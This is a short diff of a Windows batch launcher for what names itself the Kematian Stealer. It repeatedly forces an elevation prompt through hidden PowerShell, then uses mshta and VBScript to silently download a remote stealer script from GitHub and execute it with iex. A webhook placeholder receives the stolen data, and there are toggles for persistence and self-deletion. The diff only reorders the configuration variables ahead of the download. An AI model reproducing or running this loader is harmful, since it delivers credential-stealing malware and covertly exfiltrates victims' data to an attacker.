@@ -2,4 +2,4 @@
 cd /d "%~dp0"
 net session >nul 2>&1
 if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main_ps1_bat.ps1' -UseBasicParsing;$webhook = 'YOUR_URL_HERE_SERVER';$debug = $false;$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $false | iex",0))
+mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$webhook = 'YOUR_URL_HERE_SERVER';$debug = $false;$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $false;$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main_ps1_bat.ps1' -UseBasicParsing | iex",0))
